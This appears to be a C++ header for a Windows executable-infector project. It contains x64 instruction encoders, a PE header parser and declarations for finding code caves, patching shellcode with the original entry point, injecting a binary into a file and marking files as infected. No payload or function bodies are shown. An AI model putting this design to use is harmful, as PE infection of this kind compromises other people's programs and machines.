
#ifndef X_INJECTW_H
#define X_INJECTW_H

#include <iostream>
#include <Windows.h>
#include <stdio.h>
#define SHELLCODE_SIZE 65

namespace x64 {

/**
 * Constants for x64 general purpose registers.
 */
enum Reg {
  rax,
  rcx,
  rdx,
  rbx,
  rsi,
  rdi,
  rsp,
  rbp,
  r8,
  r9,
  r10,
  r11,
  r12,
  r13,
  r14,
  r15
};

/**
 * Encoding of Conditional Test (tttn) Field.
 */
enum Cond {
  O,            // 0000 = Overflow
  NO,           // 0001 = No overflow
  B, NAE = B,   // 0010 = Below, Not above or equal
  NB, AE = NB,  // 0011 = Not below, Above or equal
  E, Z = E,     // 0100 = Equal, Zero
  NE, NZ = NE,  // 0101 = Not equal, Not zero
  BE, NA = BE,  // 0110 = Below or equal, Not above
  NBE, A = NBE, // 0111 = Not below or equal, Above
  S,            // 1000 = Sign
  NS,           // 1001 = Not sign
  P, PE = P,    // 1010 = Parity, Parity Even
  NP, PO = NP,  // 1011 = Not parity, Parity Odd
  L, NGE = L,   // 1100 = Less than, Not greater than or equal to
  NL, GE = NL,  // 1101 = Not less than, Greater than or equal to
  LE, NG = LE,  // 1110 = Less than or equal to, Not greater than
  NLE, G = NLE, // 1111 = Not less
};

inline char offset_8bits(void* source, void* target) {
  return static_cast<char>(static_cast<char *>(target) - static_cast<char *>(source));
}

struct ret {
  unsigned char opc{0xC3};
};

struct nop {
  unsigned char opc{0x90};
};

struct pushad {
  unsigned char opc{0x60};
};

struct popad {
  unsigned char opc{0x61};
};

template <Reg REG>
struct pushq {
  unsigned char reg : 3;
  unsigned char opc : 5;

  pushq() //register alternate encoding
    : reg{REG}
    , opc{0b01010} {
    //static_assert(REG <= 0b0111, "1-byte encoding supports only rax-rbp");
  }
};

template <Reg REG>
struct popq {
  unsigned char reg : 3;
  unsigned char opc : 5;

  popq()
    : reg{REG}
    , opc{0b01011} {
    static_assert(REG <= 0b0111, "1-byte encoding supports only rax-rbp");
  }
};

struct rex {
  unsigned char b : 1; //расшир-нерасшир
  unsigned char x : 1;
  unsigned char r : 1;
  unsigned char w : 1;
  unsigned char pref : 4;

  rex(unsigned char w, unsigned char r, unsigned char x, unsigned char b)
    : b{b}
    , x{x}
    , r{r}
    , w{w}
    , pref{0b0100} {}
};

template <Reg REG>
struct inc {
  rex pref;
  unsigned char opc1;
  unsigned char reg : 3;
  unsigned char opc2 : 5;

  inc()
    : pref{1, 0, 0, REG >> 3}
    , opc1{0b11111111}
    , reg{REG}
    , opc2{0b11000} {}
};

template <Reg REG>
struct dec {
  rex pref;
  unsigned char opc1;
  unsigned char reg : 3;
  unsigned char opc2 : 5;

  dec()
    : pref{1, 0, 0, REG >> 3}
    , opc1{0b11111111}
    , reg{REG}
    , opc2{0b11001} {}
};

#pragma pack(1)
template <Reg REG, int IMM>
struct mov {
  rex pref;
  unsigned char opc1;
  unsigned char reg : 3;
  unsigned char opc2 : 5;
  unsigned int imm;

  mov() //immediate to register
    : pref{1, 0, 0, REG >> 3}
    , opc1{0b11000111}
    , opc2{0b11000}
    , reg{REG}
    , imm{IMM} {}
};

template <Reg REG, char IMM>
struct add {
  rex pref;
  unsigned char opc1;
  unsigned char reg : 3;
  unsigned char opc2 : 5;
  char imm;

  add() //opc1 -> opc2 -> reg -> imm см табл на стр 76 INTEL B.2
  //s - sign extend to fill
  //w - register width w=1,
    : pref{1, 0, 0, REG >> 3}
    , opc1{0b10000011}
    , reg{REG}
    , opc2{0b11000}
    , imm{IMM} {}
};

template <Reg REG, char IMM>
struct and_I {
  rex pref;
  unsigned char opc1;
  unsigned char reg : 3;
  unsigned char opc2 : 5;
  char imm;

  and_I() //immediate to register
    : pref{1, 0, 0, REG >> 3}
    , opc1{0b10000011}  // s = 1, w = 1
    , reg{REG}
    , opc2{0b11100}
    , imm{IMM} {}
};

template <Reg REG1, Reg REG2>
struct and_R {
  rex pref;
  unsigned char opc1 ;
  unsigned char reg1 : 3;
  unsigned char reg2 : 3;
  unsigned char opc2 : 2;

  and_R() //reg1 to reg2
    : pref{1, 0, 0, REG1 >> 3}
    , opc1{0b00100001}  // s = 1, w = 1
    , opc2{0b11}
    , reg1{REG1}
    , reg2{REG2} {}
};

template <Reg REG>
struct not_I {
  rex pref;
  unsigned char opc1;
  unsigned char reg : 3;
  unsigned char opc2 : 5;


  not_I() //register
    : pref{1, 0, 0, REG >> 3}
    , opc1{0b11110111}
    , reg{REG}
    , opc2{0b11010} {}
};

struct jmp {
  unsigned char opc;
  char off;

  jmp(char offset)
    : opc{0b11101011}
    , off{offset} {}

  jmp(void* target)
    : jmp{static_cast<char>(offset_8bits(this, target) - sizeof(*this))} {}
};

template <Cond COND>
struct j {
  unsigned char opc : 4;
  unsigned char tttn : 4;
  char off;

  j(char offset)
    : opc{0b0111}
    , tttn{COND}
    , off{offset} {}

  j(void* target)
    : j{static_cast<char>(offset_8bits(this, target) - sizeof(*this))} {}
};

template <Reg REG, char IMM>
struct cmp {
  rex pref;
  unsigned char opc1;
  unsigned char reg : 3;
  unsigned char opc2 : 5;
  char imm;
  cmp() //
    : pref{1, 0, 0, REG >> 3}
    , opc1{0b10000011}
    , reg{REG}
    , opc2{0b11111}
    , imm{IMM} {}
};

template <Reg REG, char IMM>
struct shl {
  rex pref;
  unsigned char opc1;
  unsigned char reg : 3;
  unsigned char opc2 : 5;
  char imm;

  shl() //reg by imm count
    : pref{1, 0, 0, REG >> 3}
    , opc1{0b11000001}
    , reg{REG}
    , opc2{0b11100}
    , imm{IMM} {}
};

template <Reg REG, char IMM>
struct shr {
  rex pref;
  unsigned char opc1;
  unsigned char reg : 3;
  unsigned char opc2 : 5;
  char imm;

  shr() //reg by imm count
    : pref{1, 0, 0, REG >> 3}
    , opc1{0b11000001}
    , reg{REG}
    , opc2{0b11101}
    , imm{IMM} {}
};

template <Reg REG, char IMM>
struct sar {
  rex pref;
  unsigned char opc1;
  unsigned char reg : 3;
  unsigned char opc2 : 5;
  char imm;

  sar() //reg by imm count
    : pref{1, 0, 0, REG >> 3}
    , opc1{0b11000001}
    , opc2{0b11111}
    , reg{REG}
    , imm{IMM} {}
};

template <Reg REG1, Reg REG2, int DISP>
struct lea {
  rex pref;
  unsigned char opc1;
  unsigned char reg2 : 3;
  unsigned char reg1 : 3;
  unsigned char mod: 2;
  unsigned char disp;

  lea()
    : pref{1, 0, 0, REG1 >> 3}
    , opc1{0b10001101}
    , mod{0b01}
    , reg1{REG1}
    , reg2{REG2}
    , disp{DISP} {}
};

template <int DISP>
struct call {
  unsigned char opc1;
  unsigned char disp;

  call()
    : opc1{0b11101000}
    , disp{DISP} {}
};


template <Reg REG, char IMM>
struct xor_I {
  rex pref;
  unsigned char opc1;
  unsigned char reg : 3;
  unsigned char opc2 : 5;
  char imm;

  xor_I()
    : pref{1, 0, 0, REG >> 3}
    , opc1{0b10000011}
    , reg{REG}
    , opc2{0b11000}
    , imm{IMM} {}
};

template <Reg REG1, Reg REG2>
struct xor_R {
  rex pref;
  unsigned char opc1 ;
  unsigned char reg1 : 3;
  unsigned char reg2 : 3;
  unsigned char opc2 : 2;


  xor_R() //reg1 to reg2
    : pref{1, 0, 0, REG1 >> 3}
    , opc1{0b00110001}  // s = 1, w = 1
    , opc2{0b11}
    , reg1{REG1}
    , reg2{REG2} {}
};

template <Reg REG1, Reg REG2>
struct test_R {
  rex pref;
  unsigned char opc1 ;
  unsigned char reg1 : 3;
  unsigned char reg2 : 3;
  unsigned char opc2 : 2;


  test_R() //reg1 to reg2
    : pref{1, 0, 0, REG1 >> 3}
    , opc1{0b10000101}  // s = 1, w = 1
    , opc2{0b11}
    , reg1{REG1}
    , reg2{REG2} {}
};

template <Reg REG, char IMM>
struct test_I {
  rex pref;
  unsigned char opc1 ;
  unsigned char reg : 3;
  unsigned char opc2 : 5;
  char imm;

  test_I() //reg1 to reg2
    : pref{1, 0, 0, REG >> 3}
    , opc1{0b11110111}  // s = 1, w = 1
    , opc2{0b11000}
    , reg{REG}
    , imm{IMM} {}
};

template <Reg REG1, Reg REG2>
struct or_R {
  rex pref;
  unsigned char opc1;
  unsigned char reg1 : 3;
  unsigned char reg2 : 3;
  unsigned char opc2 : 5;


  or_R() //immediate to register mod and r/m ?
    : pref{1, 0, 0, REG1 >> 3}
    , opc1{0b10000011}
    , opc2{0b11001}
    , reg1{REG1}
    , reg2{REG2} {}
};


template <Reg REG, char IMM>
struct or_I {
  rex pref;
  unsigned char opc1;
  unsigned char reg : 3;
  unsigned char opc2 : 5;
  char imm;

  or_I() //immediate to register mod and r/m ?
    : pref{1, 0, 0, REG >> 3}
    , opc1{0b10000011}
    , opc2{0b11001}
    , reg{REG}
    , imm{IMM} {}
};



/**
 * Empty function: void func() {}
 */
#pragma pack(1)
struct EmptyFunction {
  mov<rax, 15> i13;
  add<rax, 7> i01;
  pushq<rax> i0;
  popq<rax> i1;
  ret i2;

  long operator()() {
     auto func = reinterpret_cast<long (*)()>(this);
     return func();
  }
};




} // namespace x64

void shellcode();


class MappedFile
{
public:
    MappedFile(LPTSTR szFilename);

    LPBYTE getViewOfFile() //Get the start of projection file
    {
        return m_lpFile;
    }

    ~MappedFile()
    {
        UnmapViewOfFile(m_lpFile);
        CloseHandle(m_hMapping);
        CloseHandle(m_hFile); //Closing file
    }

    private:
        HANDLE m_hFile;
        HANDLE m_hMapping;
        LPBYTE m_lpFile;
};

class PEParser
{
private:
  LPBYTE m_lpFile;
  PIMAGE_DOS_HEADER m_pidh;
  PIMAGE_NT_HEADERS m_pinh;
  PIMAGE_FILE_HEADER m_pifh;
  PIMAGE_OPTIONAL_HEADER m_pioh;
public:
  PEParser(LPBYTE lpFile) : m_lpFile(lpFile)
  {
      m_pidh = PIMAGE_DOS_HEADER(lpFile);
      if (m_pidh->e_magic != IMAGE_DOS_SIGNATURE)
      {
          throw std::runtime_error("There's not executable file!");
      }

      m_pinh = PIMAGE_NT_HEADERS(lpFile + m_pidh->e_lfanew); // Get PE-header (NT)
      if (m_pinh->Signature != IMAGE_NT_SIGNATURE) //Check PE signature
      {
          throw std::runtime_error("There's not executable file!");
      }

      m_pifh = PIMAGE_FILE_HEADER(&m_pinh->FileHeader);
      m_pioh = PIMAGE_OPTIONAL_HEADER(&m_pinh->OptionalHeader);
  }

  // Return headers
  PIMAGE_DOS_HEADER getDosHeader()
  {
      return m_pidh;
  }

  PIMAGE_NT_HEADERS getNtHeaders()
  {
      return m_pinh;
  }

  PIMAGE_FILE_HEADER getFileHeader()
  {
      return m_pifh;
  }

  PIMAGE_OPTIONAL_HEADER getOptionalHeader()
  {
      return m_pioh;
  }

  //
  int getNumberOfSections()
  {
      return m_pifh->NumberOfSections;
  }

  //
  PIMAGE_SECTION_HEADER getSectionHeader(int nSection)
  {
      if (nSection > this->getNumberOfSections())
      {
          return NULL;
      }

      return PIMAGE_SECTION_HEADER(m_lpFile + m_pidh->e_lfanew +
          sizeof(m_pinh->Signature) + sizeof(IMAGE_FILE_HEADER)+
          m_pifh->SizeOfOptionalHeader +
          sizeof(IMAGE_SECTION_HEADER) * (nSection - 1));
  }
};

BOOL isInfected(PIMAGE_DOS_HEADER pidh);


void markAsInfected(PIMAGE_DOS_HEADER pidh);


typedef struct CODE_CAVE
{
  DWORD  dwPosition;
  PIMAGE_SECTION_HEADER pish; // Pointer to CodeCave
} CODE_CAVE, *PCODE_CAVE;

// Функция возвращающая структуру CODE_CAVE
CODE_CAVE findCodeCave(LPBYTE lpFile, PEParser* pePars);

void modificateShellcode(LPVOID lpShellcode, DWORD dwOEP);

namespace xinject {
namespace windows {
template<typename T>
void inject(const std::string &path, const T &binary);


} // namespace windows
} // namespace xinject

#endif //X_INJECTW_H
